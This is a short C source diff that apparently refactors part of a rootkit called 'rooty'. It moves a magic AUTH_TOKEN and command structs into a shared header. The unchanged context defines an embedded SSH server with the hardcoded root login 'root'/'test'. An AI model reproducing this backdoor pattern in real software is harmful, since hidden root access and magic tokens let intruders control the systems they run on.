@@ -13,22 +13,11 @@
 #include <net/if.h>
 #include <arpa/inet.h>
 
+#include "../common/rooty_uapi.h"
+
 #define SSHD_USER "root"
 #define SSHD_PASSWORD "test"
 #define KEYS_FOLDER "/etc/ssh/"
-#define AUTH_TOKEN 0xDEADC0DE
-
-
-struct rooty_proc_args
-{
-    pid_t pid;
-};
-
-struct rooty_args
-{
-    unsigned short cmd;
-    void *ptr;
-};
 
 static int port = 22;
 
